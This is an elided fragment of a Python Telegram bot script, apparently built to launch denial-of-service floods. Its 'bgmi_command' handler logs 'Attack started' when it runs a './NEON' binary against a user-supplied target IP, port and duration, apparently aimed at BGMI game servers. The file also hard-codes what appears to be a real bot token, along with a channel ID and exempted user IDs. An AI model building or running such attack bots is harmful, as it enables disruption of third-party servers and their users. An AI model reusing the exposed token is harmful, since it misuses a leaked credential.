...
TOKEN = '7906581411:AAFf-6zpt8wOV93ArO0pfvCCnVGjulRaL7s'  # Replace with your actual bot token
CHANNEL_ID = '-4713600535'  # Replace with your specific channel or group ID
# Initialize the bot
...
EXEMPTED_USERS = [6654576379,5931810285]
...
def bgmi_command(message):
    ...
    try:
        ...
        logging.info(f"Attack started by {user_name}: ./NEON {target_ip} {target_port} {default_duration} 677")
